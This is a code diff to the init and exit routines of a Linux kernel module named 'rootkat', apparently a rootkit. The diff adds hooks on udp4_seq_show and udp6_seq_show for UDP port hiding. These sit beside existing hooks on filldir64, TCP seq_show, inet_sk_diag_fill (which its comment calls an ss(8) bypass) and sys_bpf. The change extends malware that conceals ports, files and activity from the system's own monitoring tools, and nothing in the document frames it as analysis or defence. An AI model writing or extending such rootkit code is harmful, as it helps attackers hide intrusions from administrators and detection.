@@ -9,6 +9,7 @@
 #include "hook_filldir64.h"
 #include "hook_tcp4_seq_show.h"
 #include "hook_tcp6_seq_show.h"
+#include "hook_udp_seq_show.h"
 #include "hook_inet_sk_diag_fill.h"
 #include "hook_sys_bpf.h"
 
@@ -66,6 +67,14 @@ static int __init rootkat_init(void)
 		return rc;
 	}
 
+	/* UDP port hiding — non-fatal, mirrors TCP. */
+	rc = rootkat_hook_udp4_seq_show_install();
+	if (rc)
+		pr_warn(ROOTKAT_TAG "udp4_seq_show hook failed: %d\n", rc);
+	rc = rootkat_hook_udp6_seq_show_install();
+	if (rc)
+		pr_warn(ROOTKAT_TAG "udp6_seq_show hook failed: %d\n", rc);
+
 	/* Non-fatal: this hook depends on a symbol that may be inlined or
 	 * renamed on some kernels. If it doesn't resolve, the ss(8) bypass
 	 * stays open, but every other hook still works. Log + continue. */
@@ -88,6 +97,8 @@ static void __exit rootkat_exit(void)
 {
 	rootkat_hook_sys_bpf_remove();
 	rootkat_hook_inet_sk_diag_fill_remove();
+	rootkat_hook_udp6_seq_show_remove();
+	rootkat_hook_udp4_seq_show_remove();
 	rootkat_hook_tcp6_seq_show_remove();
 	rootkat_hook_tcp4_seq_show_remove();
 	rootkat_hook_filldir64_remove();
